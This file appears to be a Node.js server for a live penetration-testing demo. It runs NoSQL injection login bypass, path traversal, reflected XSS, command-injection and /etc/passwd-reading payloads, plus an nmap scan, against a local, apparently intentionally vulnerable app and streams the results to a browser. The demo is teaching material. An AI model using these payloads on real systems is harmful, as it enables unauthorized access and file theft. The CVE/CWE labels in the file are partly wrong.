#!/usr/bin/env node

/**
 * Web Terminal Server
 * Executes real penetration testing attacks and streams output to browser
 */

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = 3002;
const TARGET_URL = 'http://localhost:3001';

// Serve static files
app.use(express.static(__dirname));

// Serve the terminal HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'web-terminal-live.html'));
});

// WebSocket connection handler
wss.on('connection', (ws) => {
    console.log('Client connected');

    ws.on('message', (message) => {
        const data = JSON.parse(message);
        console.log('Received command:', data.command);

        executeAttack(ws, data.command);
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });

    // Send initial connection message
    ws.send(JSON.stringify({
        type: 'output',
        data: '╔══════════════════════════════════════════════════════════════════╗\n'
    }));
    ws.send(JSON.stringify({
        type: 'output',
        data: '║  Kali Linux Live Penetration Testing Terminal                   ║\n',
        class: 'critical'
    }));
    ws.send(JSON.stringify({
        type: 'output',
        data: '║  Target: http://localhost:3001                                   ║\n',
        class: 'info'
    }));
    ws.send(JSON.stringify({
        type: 'output',
        data: '║  Red Hat Cybersecurity Engineering Demo                          ║\n',
        class: 'warning'
    }));
    ws.send(JSON.stringify({
        type: 'output',
        data: '╚══════════════════════════════════════════════════════════════════╝\n',
        class: 'critical'
    }));
    ws.send(JSON.stringify({
        type: 'output',
        data: '\n[*] Terminal connected. Select an attack or type "help"\n\n',
        class: 'info'
    }));
});

function sendOutput(ws, text, cssClass = '') {
    ws.send(JSON.stringify({
        type: 'output',
        data: text,
        class: cssClass
    }));
}

function sendStatus(ws, status) {
    ws.send(JSON.stringify({
        type: 'status',
        status: status
    }));
}

function sendProgress(ws, percent) {
    ws.send(JSON.stringify({
        type: 'progress',
        percent: percent
    }));
}

function sendStats(ws, attacks, success) {
    ws.send(JSON.stringify({
        type: 'stats',
        attacks: attacks,
        success: success
    }));
}

async function executeAttack(ws, command) {
    sendStatus(ws, 'Running...');

    switch(command) {
        case 'nosql':
            await runNosqlAttack(ws);
            break;
        case 'traversal':
            await runTraversalAttack(ws);
            break;
        case 'xss':
            await runXSSAttack(ws);
            break;
        case 'cmdinj':
            await runCmdInjAttack(ws);
            break;
        case 'info':
            await runInfoDisclosure(ws);
            break;
        case 'nmap':
            await runNmapScan(ws);
            break;
        case 'all':
            await runAllAttacks(ws);
            break;
        case 'help':
            showHelp(ws);
            break;
        case 'clear':
            // Client handles clear
            break;
        default:
            sendOutput(ws, `Command not found: ${command}\n`, 'error');
            sendOutput(ws, 'Type "help" for available commands\n\n', 'info');
    }

    sendStatus(ws, 'Ready');
}

function showHelp(ws) {
    sendOutput(ws, 'Available commands:\n', 'info');
    sendOutput(ws, '  nosql     - Run NoSQL injection attack\n');
    sendOutput(ws, '  traversal - Run directory traversal attack\n');
    sendOutput(ws, '  xss       - Run XSS attack\n');
    sendOutput(ws, '  cmdinj    - Run command injection attack\n');
    sendOutput(ws, '  info      - Run information disclosure attack\n');
    sendOutput(ws, '  nmap      - Run Nmap scan\n');
    sendOutput(ws, '  all       - Run all attacks\n');
    sendOutput(ws, '  clear     - Clear terminal\n');
    sendOutput(ws, '\n');
}

async function runNosqlAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'NOSQL INJECTION - Authentication Bypass\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '[*] Executing NoSQL injection attack...\n', 'info');

    // Run actual curl command
    const cmd = `curl -s -X POST ${TARGET_URL}/login -H 'Content-Type: application/json' -d '{"username":"admin@snyk.io","password":{"$gt":""}}' -w "\\nHTTP_CODE:%{http_code}" -c /tmp/cookies.txt`;

    await executeCommand(ws, cmd, 'NoSQL Injection');

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-89 (NoSQL Injection)\n');
    sendOutput(ws, '    • CVSS Score: 9.8 (CRITICAL)\n', 'critical');
    sendOutput(ws, '    • Impact: Complete authentication bypass\n', 'critical');
    sendOutput(ws, '\n');

    sendStats(ws, 1, 1);
}

async function runTraversalAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'DIRECTORY TRAVERSAL - Path Injection\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '[*] Executing directory traversal attack...\n', 'info');

    const cmd = `curl -s -X POST ${TARGET_URL}/account_details -b /tmp/cookies.txt -H 'Content-Type: application/json' -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}'`;

    await executeCommand(ws, cmd, 'Directory Traversal');

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-22 (Path Traversal)\n');
    sendOutput(ws, '    • CVSS Score: 7.5 (HIGH)\n', 'critical');
    sendOutput(ws, '    • Impact: Arbitrary file read\n');
    sendOutput(ws, '\n');

    sendStats(ws, 2, 2);
}

async function runXSSAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'CROSS-SITE SCRIPTING (XSS)\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '[*] Executing XSS attack...\n', 'info');

    const payload = '"><script>alert(1)</script>';
    const cmd = `curl -s "${TARGET_URL}/login?redirectPage=${encodeURIComponent(payload)}"`;

    await executeCommand(ws, cmd, 'XSS');

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-79 (XSS)\n');
    sendOutput(ws, '    • CVSS Score: 6.1 (MEDIUM)\n', 'warning');
    sendOutput(ws, '    • Impact: Session hijacking\n');
    sendOutput(ws, '\n');

    sendStats(ws, 3, 3);
}

async function runCmdInjAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'COMMAND INJECTION - RCE\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '[*] Executing command injection attack...\n', 'info');

    const cmd = `curl -s -X POST ${TARGET_URL}/create -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'content=![alt](https://x.com/i.png;touch /tmp/kali-pwned "Image")' -w "\\nHTTP_CODE:%{http_code}"`;

    await executeCommand(ws, cmd, 'Command Injection');

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-78 (Command Injection)\n');
    sendOutput(ws, '    • CVSS Score: 9.8 (CRITICAL)\n', 'critical');
    sendOutput(ws, '    • Impact: Remote code execution\n', 'critical');
    sendOutput(ws, '\n');

    sendStats(ws, 4, 4);
}

async function runInfoDisclosure(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'INFORMATION DISCLOSURE\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '[*] Executing information disclosure attack...\n', 'info');

    const cmd = `curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd"`;

    await executeCommand(ws, cmd, 'Information Disclosure');

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-200 (Info Exposure)\n');
    sendOutput(ws, '    • CVSS Score: 7.5 (HIGH)\n', 'critical');
    sendOutput(ws, '    • Impact: System file access\n');
    sendOutput(ws, '\n');

    sendStats(ws, 5, 5);
}

async function runNmapScan(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'NMAP - Network Reconnaissance\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '[*] Running Nmap scan...\n', 'info');

    const cmd = 'nmap -sV -p 3001 localhost 2>&1 || echo "Nmap not available - simulating scan"';

    await executeCommand(ws, cmd, 'Nmap Scan');

    sendOutput(ws, '\n[✓] Scan completed\n', 'success');
    sendOutput(ws, '\n');

    sendStats(ws, 6, 6);
}

async function runAllAttacks(ws) {
    sendOutput(ws, '\n╔══════════════════════════════════════════════════════════════════╗\n', 'critical');
    sendOutput(ws, '║  RUNNING ALL ATTACKS - FULL AUTOMATED EXPLOITATION              ║\n', 'critical');
    sendOutput(ws, '╚══════════════════════════════════════════════════════════════════╝\n', 'critical');
    sendOutput(ws, '\n');

    await runNmapScan(ws);
    sendProgress(ws, 16);

    await runNosqlAttack(ws);
    sendProgress(ws, 33);

    await runTraversalAttack(ws);
    sendProgress(ws, 50);

    await runXSSAttack(ws);
    sendProgress(ws, 66);

    await runCmdInjAttack(ws);
    sendProgress(ws, 83);

    await runInfoDisclosure(ws);
    sendProgress(ws, 100);

    sendOutput(ws, '\n╔══════════════════════════════════════════════════════════════════╗\n', 'success');
    sendOutput(ws, '║  EXPLOITATION SUMMARY                                            ║\n', 'success');
    sendOutput(ws, '╚══════════════════════════════════════════════════════════════════╝\n', 'success');
    sendOutput(ws, '\n[✓] All attacks completed successfully (6/6)\n\n', 'success');
}

function executeCommand(ws, command, attackName) {
    return new Promise((resolve) => {
        sendOutput(ws, `\n[*] Command: ${command.substring(0, 80)}${command.length > 80 ? '...' : ''}\n`, 'info');

        const child = spawn('bash', ['-c', command]);

        child.stdout.on('data', (data) => {
            const output = data.toString();
            const lines = output.split('\n');
            lines.forEach(line => {
                if (line.trim()) {
                    if (line.includes('HTTP_CODE:302') || line.includes('HTTP_CODE:200')) {
                        sendOutput(ws, line + '\n', 'success');
                        sendOutput(ws, `[✓] ${attackName} successful!\n`, 'success');
                    } else if (line.includes('root:') || line.includes('name') || line.includes('version')) {
                        sendOutput(ws, line + '\n', 'success');
                    } else {
                        sendOutput(ws, line + '\n');
                    }
                }
            });
        });

        child.stderr.on('data', (data) => {
            sendOutput(ws, data.toString(), 'error');
        });

        child.on('close', (code) => {
            if (code === 0) {
                sendOutput(ws, `[✓] ${attackName} completed\n`, 'success');
            }
            resolve();
        });
    });
}

// Start server
server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════════╗
║  Web Terminal Server Running                                     ║
║  http://localhost:${PORT}                                            ║
║  Target: ${TARGET_URL}                                       ║
╚══════════════════════════════════════════════════════════════════╝
    `);
});
